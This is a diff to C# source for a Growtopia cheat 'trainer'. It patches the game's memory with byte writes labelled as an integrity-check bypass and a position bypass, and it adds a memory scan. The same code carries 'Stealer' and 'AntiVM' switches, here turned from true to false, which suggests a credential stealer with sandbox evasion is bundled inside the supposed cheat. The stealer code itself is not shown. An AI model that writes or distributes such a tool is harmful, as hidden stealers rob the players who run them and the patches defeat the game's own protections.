@@ -35,8 +35,8 @@ namespace FreeZeHAX_Trainer
         private readonly TaskDefinition td = TaskService.Instance.NewTask();
         private readonly WebClient web = new WebClient();
         private readonly string NewLine = Environment.NewLine;
-        private readonly bool AntiVM = true; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
-        private readonly bool Stealer = true; // Activate / Disable Stealer
+        private readonly bool AntiVM = false; // If you don't want to check if VM then change "AntiVM = true" to "AntiVM = false".
+        private readonly bool Stealer = false; // Activate / Disable Stealer
 
         private string GetCheat(int Number)
         {
@@ -353,6 +353,7 @@ namespace FreeZeHAX_Trainer
                         {
                             CheatAddresses.Items.Add(AobScan(Cheats, false, true, false));
                         }
+                        CheatAddresses.Items.Add(AobScan("66 70 ? 3a 20"));
                         FocusText.Text = "FreeZeHAX Trainer";
                         About_Button.Enabled = true;
                         Cheat_Button.Enabled = true;
@@ -367,7 +368,7 @@ namespace FreeZeHAX_Trainer
                         mem.WriteMemory(GetCheat(2), "bytes", "90 90"); // Anti Int Check
                         mem.WriteMemory(GetCheat(22), "bytes", "E9 19 01 00 00"); // Pos Bypass
                         mem.WriteMemory(GetCheat(0), "bytes", "0F 85 9E 01 00 00"); // Force FPS
-                        //mem.WriteMemory(AobScan("66 70 ? 3a 20"), "string", "\n \nFreeZeHAX Trainer \nFps:% d                            ");
+                        mem.WriteMemory(GetCheat(27), "string", "\n \nFreeZeHAX Trainer \nFps:% d                            ");
                         //mem.ReadString("Growtopia.exe+89EBC0", length: 999);
                     }
                 }
@@ -1225,7 +1226,7 @@ namespace FreeZeHAX_Trainer
                 }
             }
             catch (Exception) { }
-            return Result;
+            return $"0x{Result:X}";
         }
     }
 }
